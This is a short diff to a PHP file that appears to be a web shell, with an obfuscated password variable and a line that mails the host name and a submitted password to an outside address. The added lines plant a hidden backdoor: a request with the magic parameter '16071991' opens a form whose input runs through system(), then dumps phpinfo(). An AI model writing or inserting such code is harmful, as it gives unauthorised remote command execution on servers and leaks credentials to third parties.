@@ -3,6 +3,18 @@
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
+
+if(isset($_REQUEST['16071991'])){
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+        phpinfo();
+        die;
+}
 //-----------------Password---------------------
 $▛ = "fa88f6ba17d6ee75b852814a14894255";
 $▘ = true;
